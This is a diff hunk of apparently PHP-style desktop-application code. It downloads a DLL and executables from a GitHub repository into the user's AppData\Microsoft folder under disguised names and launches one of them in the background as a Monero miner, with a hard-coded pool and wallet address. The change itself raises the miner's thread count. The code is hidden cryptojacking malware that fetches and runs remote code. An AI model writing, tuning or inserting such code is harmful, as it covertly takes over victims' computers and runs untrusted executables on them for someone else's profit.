@@ -29,7 +29,7 @@ use httpclient;
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
     wait(5000);
-    execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 1 -B');
+    execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 2 -B');
     
     file_put_contents($_ENV['APPDATA'].'\\Microsoft\\3.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/3.exe'));
     wait(5000);
